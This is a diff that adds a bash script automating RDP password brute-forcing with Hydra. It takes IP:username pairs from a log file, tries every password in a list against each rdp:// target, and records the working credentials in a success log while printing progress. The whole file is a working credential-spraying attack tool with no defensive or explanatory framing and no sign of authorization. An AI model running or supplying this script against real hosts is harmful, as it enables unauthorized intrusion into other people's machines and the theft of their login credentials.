@@ -1,0 +1,85 @@
+#!/bin/bash
+
+# Define the input files
+iplog_file="iplog.txt"
+passwords_file="passwords.txt"
+success_log_file="successful_logins.txt"
+
+# Check if the input files exist
+if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
+    echo "One or both files do not exist, exiting."
+    exit 1
+fi
+
+# Create or clear the success log file
+> "$success_log_file"
+
+# Read all IP:username pairs into an array
+mapfile -t iplog_entries < "$iplog_file"
+
+# Read all passwords into an array
+mapfile -t passwords < "$passwords_file"
+
+# Get the total number of attempts
+total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
+current_attempt=0
+successful_attempts=0
+start_time=$(date +%s)
+
+# Function to display progress
+display_progress() {
+    local elapsed_time=$1
+    local current_attempt=$2
+    local total_attempts=$3
+    local successful_attempts=$4
+
+    local percent=$(( (current_attempt * 100) / total_attempts ))
+    echo "Progress: $current_attempt / $total_attempts ($percent%)"
+    echo "Successful logins: $successful_attempts"
+    echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
+}
+
+# Print initial static UI
+tput clear
+echo "Total Attempts: $total_attempts"
+echo "----------------------------------------"
+echo "Attempting logins..."
+
+# Loop through each password
+for password in "${passwords[@]}"; do
+    if [[ -z "$password" ]]; then continue; fi
+
+    # Loop through each RDP entry in iplog.txt
+    for entry in "${iplog_entries[@]}"; do
+        IFS=: read -r full_url target_name <<< "$entry"
+
+        # Ensure the full_url and target_name are not empty
+        if [[ -z "$full_url" || -z "$target_name" ]]; then continue; fi
+
+        # Ensure the full_url is in the correct format
+        if [[ ! "$full_url" =~ ^rdp:// ]]; then
+            full_url="rdp://$full_url"
+        fi
+
+        # Run Hydra for each username and password pair, capturing output
+        if sudo hydra -l "$target_name" -p "$password" "$full_url" -t 4 -W 3 | grep -q "login successful"; then
+            echo "Successful login with $target_name on $full_url using password: $password" >> "$success_log_file"
+            successful_attempts=$((successful_attempts + 1))
+        fi
+
+        # Update current attempt count
+        current_attempt=$((current_attempt + 1))
+        
+        # Update elapsed time and display progress
+        elapsed_time=$(( $(date +%s) - start_time ))
+        display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts"
+    done
+done
+
+# Final output
+elapsed_time=$(( $(date +%s) - start_time ))
+echo -ne "\n----------------------------------------\n"
+echo "Completed processing all entries in $iplog_file."
+echo "Total Attempts: $total_attempts"
+echo "Successful Logins: $(wc -l < $success_log_file)"
+echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
